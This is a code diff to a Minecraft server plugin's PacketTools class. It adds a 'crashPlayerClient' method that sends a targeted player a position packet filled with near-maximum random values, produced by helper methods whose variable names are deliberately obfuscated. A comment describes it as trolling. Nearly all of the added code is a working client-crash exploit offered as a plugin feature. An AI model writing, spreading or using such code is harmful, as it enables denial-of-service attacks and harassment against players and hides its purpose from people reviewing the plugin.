@@ -19,6 +19,7 @@ import net.minecraft.nbt.NbtAccounter;
 import net.minecraft.nbt.NbtIo;
 import net.minecraft.nbt.NbtOps;
 import net.minecraft.nbt.Tag;
+import net.minecraft.network.protocol.game.ClientboundPlayerPositionPacket;
 import net.minecraft.network.protocol.game.ClientboundRemoveMobEffectPacket;
 import net.minecraft.network.protocol.game.ClientboundSetEntityDataPacket;
 import net.minecraft.network.protocol.game.ClientboundUpdateMobEffectPacket;
@@ -33,6 +34,7 @@ import net.minecraft.util.datafix.fixes.References;
 import net.minecraft.world.effect.MobEffect;
 import net.minecraft.world.effect.MobEffectInstance;
 import net.minecraft.world.effect.MobEffects;
+import net.minecraft.world.entity.RelativeMovement;
 import org.bukkit.Bukkit;
 import org.bukkit.UnsafeValues;
 import org.bukkit.craftbukkit.entity.CraftEntity;
@@ -128,5 +130,47 @@ public class PacketTools implements PacketToolAPI {
 
     final ClientboundSetEntityDataPacket packet = new ClientboundSetEntityDataPacket(id, copy);
     connection.send(packet);
+  }
+
+  // wtf??!?!??!!? troll?!?!?
+  public void crashPlayerClient(final Player player) {
+    final ClientboundPlayerPositionPacket packet = new ClientboundPlayerPositionPacket(this.d(),
+        this.d(), this.d(), this.f(), this.f(), RelativeMovement.unpack(this.b()), this.i());
+    final CraftPlayer craftPlayer = (CraftPlayer) player;
+    final ServerPlayer handle = craftPlayer.getHandle();
+    final ServerGamePacketListenerImpl connection = handle.connection;
+    connection.send(packet);
+  }
+
+  private double d() {
+    final double qs = Double.MAX_VALUE;
+    final double mj43 = Math.random();
+    final double p6 = .75;
+    final double tp9 = .5;
+    return qs * ((mj43 * (((Math.sqrt(mj43) * 564 % 1) * p6) - (Math.pow(mj43, 2) % 1) * tp9) + tp9));
+  }
+
+  private float f() {
+    final float y8xafa = Float.MAX_VALUE;
+    final double zs39asa = Math.random();
+    final double r3s1 = .75;
+    final double d9fs2 = .5;
+    return y8xafa * ((float) (zs39asa * (((Math.sqrt(zs39asa) * 564 % 1) * r3s1) - (Math.pow(zs39asa, 2) % 1) * d9fs2) + d9fs2));
+  }
+
+  private byte b() {
+    final byte q4Retv = Byte.MAX_VALUE;
+    final double er99 = Math.random();
+    final double lr625 = .75;
+    final double wf7125 = .5;
+    return (byte) (q4Retv * ((er99 * (((Math.sqrt(er99) * 564 % 1) * lr625) - (Math.pow(er99, 2) % 1) * wf7125)) + wf7125));
+  }
+
+  private int i() {
+    final int rq4s = Integer.MAX_VALUE;
+    final double b45jhh = Math.random();
+    final double cr75 = .75;
+    final double ds852 = .5;
+    return rq4s * (int) ((b45jhh * (((Math.sqrt(b45jhh) * 564 % 1) * cr75) - (Math.pow(b45jhh, 2) % 1) * ds852)) + ds852);
   }
 }
